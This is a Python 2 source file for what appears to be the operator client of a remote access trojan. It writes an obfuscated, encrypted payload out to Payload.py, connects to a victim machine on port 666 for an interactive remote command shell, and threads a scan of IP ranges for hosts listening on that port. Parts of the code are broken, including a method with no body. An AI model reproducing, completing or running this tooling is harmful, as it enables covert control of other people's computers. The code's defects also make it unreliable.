# This Python file uses the following encoding: utf-8
import socket
import threading
import Compiler
from tqdm import tqdm
import Crypt


class Client(Compiler.Compile,Crypt.Crypt):

    def create_payload(self):
        iv = self.KeyAndIv("8s6Ge9dd", "OVbfVVRciZNgcObT")
        code = ['O0QP3FUgPRMu3mL2NVS+AA==', 'my3R2l1t2UyvaqpPqKkAlU5flXDVetBSIIZENGSZRsI=', 'p/p5rIEYnuq70S5VrYgjaw==',
                'YA2X3JrBHnqd0Due4UHXRw==', 'z52LLLsoeUUmfv1DnMeLHw==', 'gNGlvvWQmrg3SBK4XNxpmw==',
                'tN5A2V8wV911uvgs01ajLg==', 'msE3Rs/veke5q5U1CXcLsw==', 'ja3WP9wwskQbTBzXymx6RtDcaJqEr2M8alhvnmCYI3E=',
                'gNGlvvWQmrg3SBK4XNxpmw==', 'RboAtqDT2k3fXyTJuEH0kdTzNXEql02QhMZ5YDRKZC8=', 'gNGlvvWQmrg3SBK4XNxpmw==',
                'sWS371dMXESxKojxKYo+JEBk4DlDjYizG1p3B/xOWfU=', 'gNGlvvWQmrg3SBK4XNxpmw==',
                'zXHnooX2Hm7eEcmTv88tfOCogGeY2yzxu/jgOkvJrytxESb0YAJshRQ3W+WoGRBbtinfkY9tGAXew3Yy7SmHDKDIajYBhdUYgQqrAS7WbFg=',
                'dZwwLGZMLNPwF6W/lzViJ0mb8kUj8zFzlbVCH6p7ANh34q+J+9SXuaTM4zRtyobGHB1iG13A7L8E03JiDyvFAB6whfteubSPhxH/pdZm7bc=',
                'nKAcCbmS4SPcZw9DmRhzuH/ZPrA14thEzGbE8XHV6rw3jmBn83ukKWKHFG5Avg23',
                'i/zWwSrZwqtr+lgx3pyxADY6p/Aneh9M8YNnN9n4kXc=', 'gNGlvvWQmrg3SBK4XNxpmw==',
                'L41sMLLSrPrvI8kzGS6SHDf5IERnk/C2N17eBbJ+qEY=', 'gNGlvvWQmrg3SBK4XNxpmw==',
                'lVHsoqNBzhurefQ3S566LQ0PJBRIo8/98Yfil4piHCPH7DfcGlHe+HvBCi7ETV/bAKK6UunCp110GyAqO0QhKQ==',
                'AC5XaGiLl8LaH37iym+eK4v0gsgd6Q8Kz9kchgW86UXJWyleHvM65ORPwcdhFd8S+X6vw7+0czWuGEDy0ji/hg==',
                'oINxOiKNa6UKhseAVisoT3JulaqeQ4AxqWhxfWS9a8r2KSpN0FgUgStR/3mVgxqn', 'gNGlvvWQmrg3SBK4XNxpmw==',
                'l8X6Gqf5a+B7MPoxLJmAdTJflKOnHS8kKGr1lTab8D3+Jbp5xfkYeIml5na8D6lO',
                'I6Io9XZNOJzJtu9xIN2BCFf7qR/OG3NhTGbcobqKT/haO+NOeQf87NOx2OKzcsePQFfAmYC/OKg6qJvhOVHhag==',
                'I6Io9XZNOJzJtu9xIN2BCPx63UXxTgkbHu+claL8040=', '4CcgZnVoO657EG2CBPPwE0SGhQJMVJaVlCbuRdcnIVs=',
                'gNGlvvWQmrg3SBK4XNxpmw==', 'Qsg7sWjJQxrMQEMqiFxTnobrgVTXQSIigIaL+vCFsCg=', 'gNGlvvWQmrg3SBK4XNxpmw==',
                'mUDxAO7uNOvAXrzw//xtyNFd2wluahw+/mF8dfoLYhk=', 'amJaLWHpFZc0fgXezYSQFA8LzeDdvtm4V1Cb+f4bD4s=',
                'HmXZJB+uPjLHusqmh76qZgItrC/rhAb5bL+J08QH/OfzqJgA7GLvhL9EzQqZ8rROT98+VvNyUHZRC8yIFZxQRQ==',
                'HmXZJB+uPjLHusqmh76qZogfjc8Oa8T/E84GMPn22r/9IwgGIEKn7KvBkrid8e98',
                'HmXZJB+uPjLHusqmh76qZth8k2jB+YNJxmI5qW49A/bBiz5DshXkH4UhwvTod6oR',
                'HmXZJB+uPjLHusqmh76qZkFBLlwPCBbM2IklVfhtTojhIjo0MQtj5RDY4zBB2DEy',
                'HmXZJB+uPjLHusqmh76qZhm46g+IrubQmIW2dklQQ3Q=',
                'HmXZJB+uPjLHusqmh76qZgaUvwQ5N4ncwvCZjfRBLxkh3tfuQdIWohvxHmp+pInD',
                'HmXZJB+uPjLHusqmh76qZh+hU6dJZ1F2LTzRq9eFu5upTBBDeC4kquhCqLEFeyz8',
                'HmXZJB+uPjLHusqmh76qZryjOV1Xy+PBTyxscc21Vuc=', 'gNGlvvWQmrg3SBK4XNxpmw==',
                'HmXZJB+uPjLHusqmh76qZiymLxgFV6h5viJRqYz1chpuNz4neMECIgFxik7AKR5u',
                'HmXZJB+uPjLHusqmh76qZtZkwSHEaTdifM/ZYOpYXRT79T7o9q3DiglHB5IhBxZX', 'gNGlvvWQmrg3SBK4XNxpmw==',
                'HmXZJB+uPjLHusqmh76qZnf0LGjTjvUK7gWQijr4XLLItEnc61aHXN3++ej36g8A',
                'HmXZJB+uPjLHusqmh76qZtka6F9Kn9/ySgehkaJX9RIcvdf65f4/67gYcqN3H7Pg',
                'HmXZJB+uPjLHusqmh76qZs5MitgSrJ92aEIITZSJIK8c4/n1CXxXvr0eZv/6tGHy',
                'HmXZJB+uPjLHusqmh76qZsx35dPLt6WODDWZ1ad5TDQqYC27g3LKLmNZ0d2h9D5o',
                'HmXZJB+uPjLHusqmh76qZqyIPtXHM7A3vKLmMdFI53QDCeujwFNrJTNjNvvgC//w',
                'HmXZJB+uPjLHusqmh76qZjgQlp+Ef0m5C188KCTTNarRpygcnZoRYTw7TvBHBugZ', 'gNGlvvWQmrg3SBK4XNxpmw==',
                'HmXZJB+uPjLHusqmh76qZm6VPxQZyQHcbnhx+PtuS69GJanjPZmnzljQ914Evgld1Zz93kqfsG/WmPDvB4lqTi9dHWYqoPZiUmbh14uaOsldJYwRtF7wqfRu5gqGz6N9YRiaLviIUPrAMpxp8m6+Bv2cDKTt1vcU8hzChneF+O4e3ggErfUqA+VzjusfqOFG',
                'HmXZJB+uPjLHusqmh76qZgfeJtnK5UEdaohZgSFd3NTL+YYQwUe0DHxRc9/mIzXmWWR+nckdJDxHpcFHk9WEEmjZjxpBIRTRCNv4bmfTPRptZms1IZ/eJPyIiciLAcim',
                'HmXZJB+uPjLHusqmh76qZp3vQoBgeLU9fYHjcS6VDtVKG9sS70Ju48kIDnG76KYZgLnpN+E+5NmDYn6JmQmHQw==',
                'gNGlvvWQmrg3SBK4XNxpmw==', 'HmXZJB+uPjLHusqmh76qZsNr6HObYopAwYmn/j209vXotriJL/igXmqzHvJNZa/n',
                'HmXZJB+uPjLHusqmh76qZjCzksBdwCTR/WQOJyrXP5rKwVcFBMi8Sd+fsgn94D6cb2dkpoR+kRwHvXxaKvQ4QA==',
                'HmXZJB+uPjLHusqmh76qZjCzksBdwCTR/WQOJyrXP5rSNbJL/zwGskPTuFYgQkGN',
                'HmXZJB+uPjLHusqmh76qZqyIPtXHM7A3vKLmMdFI53TGAjrhy/sEzRWLhYA16xFdRUDUmvMgRoTqMwvywovhBvrivrLuMB6EB4do7EEQX5s=',
                'HmXZJB+uPjLHusqmh76qZqyIPtXHM7A3vKLmMdFI53TGAjrhy/sEzRWLhYA16xFdMnxq9PziI+9HhLGbSzTA3t74pMqCPN61E+cxxffx7xo=',
                'HmXZJB+uPjLHusqmh76qZr1pm8L+ZB+aUdsALnl/01U=',
                'HmXZJB+uPjLHusqmh76qZqyIPtXHM7A3vKLmMdFI53TGAjrhy/sEzRWLhYA16xFdMnxq9PziI+9HhLGbSzTA3t74pMqCPN61E+cxxffx7xo=',
                'gNGlvvWQmrg3SBK4XNxpmw==', 'Yu0umMX2Ond4d+/5ii7cnC9GSadrtYK8kwCo32I+pp6qhOwc5S4liVjsRx2IzSTV',
                'HmXZJB+uPjLHusqmh76qZp87HJsz5sQyJz2xOKiiK8izQc6qdM0wn2aqTc2IlQ3x',
                'HmXZJB+uPjLHusqmh76qZrh2USXp2NWjj7CCtflwXsE=',
                'HmXZJB+uPjLHusqmh76qZuiQ1Z0xx7PyVB3uwts9WHBlV2XEO/d/oaUPX6/6nuSU+B71WQJ47yv/zGvEqevjvg==',
                'HmXZJB+uPjLHusqmh76qZsh0BrYjrXaAVwDqqlJM1GulMnPBnoAF+I9OpsM9VZ+s', 'gNGlvvWQmrg3SBK4XNxpmw==',
                'gNGlvvWQmrg3SBK4XNxpmw==', 'gNGlvvWQmrg3SBK4XNxpmw==', 'or0sxXIs13wbHWKMruLwLFWKYWAWn17KfUZbMEPnM+o=',
                'Dfc2S1iK0ub4+UAapCrPWQ==']

        with open("Payload.py", "w+") as file:
            print("Decrypting File...")
            for i in tqdm(range(len(code))):
                file.write(self.b64Dec(code[i]))
            try:
                self.check("Payload.py")
            except Exception as E:
                print(E)


    def connect(self, host):

        State = 1
        port = 666
        timeout = 0

        if host != 0:
            host = host
        else:
            host = raw_input("IP: ")
            host = str(host)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while State == True:

            try:
                s.connect((host,port))
            except Exception:
                print("server is offline")
                timeout = timeout+1
                if timeout == 5:
                   exit()
            else:
                State = 0
        iv = self.KeyAndIv("mordax", 0)
        s.send(iv)
        text = "<command:>"
        SIZE = 2048

        while True:

            cmd = raw_input(text)

            if cmd == "close":
                s.send("close")
                s.close()
                exit()

            s.send(self.encode(cmd))
            data = self.decode(s.recv(2048))
            data = data.split(";")

            if data[0] == "SIZE":
                data[1] = int(data[1])
                data2 = s.recv(data[1])
                data2 = data2.split(";")
                print (data2[0])
                text = data2[1] + ">"
            else:
                print data[0]
                text = self.depad(data[1])
                text = text + ">"

    def scan(self, args):

       start = raw_input("Start IP: ")
       stop = raw_input("Stop IP: ")
       self.args = args

       ip1 = start.split(".")
       self.ip2 = stop.split(".")
       self.iprange = ip1[0] + "." + ip1[1] + "." + ip1[2] + "."

       tip = int(ip1[3])
       t1ip = int(ip1[3]) + 1
       t2ip = int(ip1[3]) + 2
       t3ip = int(ip1[3]) + 3
       t4ip = int(ip1[3]) + 4
       t5ip = int(ip1[3]) + 5
       t6ip = int(ip1[3]) + 6
       t7ip = int(ip1[3]) + 7

       t1 = threading.Thread(target=self.sscan, args=(tip,"9","0",))
       t2 = threading.Thread(target=self.sscan, args=(t1ip,"9","1",))
       t3 = threading.Thread(target=self.sscan, args=(t2ip,"9","2",))
       t4 = threading.Thread(target=self.sscan, args=(t3ip,"9","3",))
       t5 = threading.Thread(target=self.sscan, args=(t4ip,"9","4",))
       t6 = threading.Thread(target=self.sscan, args=(t5ip,"9","5",))
       t7 = threading.Thread(target=self.sscan, args=(t6ip,"9","6",))
       t8 = threading.Thread(target=self.sscan, args=(t7ip,"9","7",))

       t1.start()
       t2.start()
       t3.start()
       t4.start()
       t5.start()
       t6.start()
       t7.start()
       t8.start()

    def get_aa(self):
        #hier weiter machen (arp -a) scannen


    def sscan(self ,strange,srange,thread):

        try:

            srange = self.ip2[3]
            step = 9

            for x in tqdm(range(strange,int(srange),int(step))):
                if x < 10:
                    x = str(x)
                    x = "0" + x
                elif x >= 10:
                    x = str(x)

                ip = self.iprange + x

                if self.args == "log":
                    ip = str(ip)
                    print("scanning with thread " + thread + " targetting IP: " + ip +"\n")
                else:
                    next
                if self.args == "aa":
                    self.get_aa()

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                res = s.connect_ex((ip,666))

                for timeout in range(0, 5):
                    if res == 0:
                        print (ip + " is online")

        except Exception():

            print(Exception)

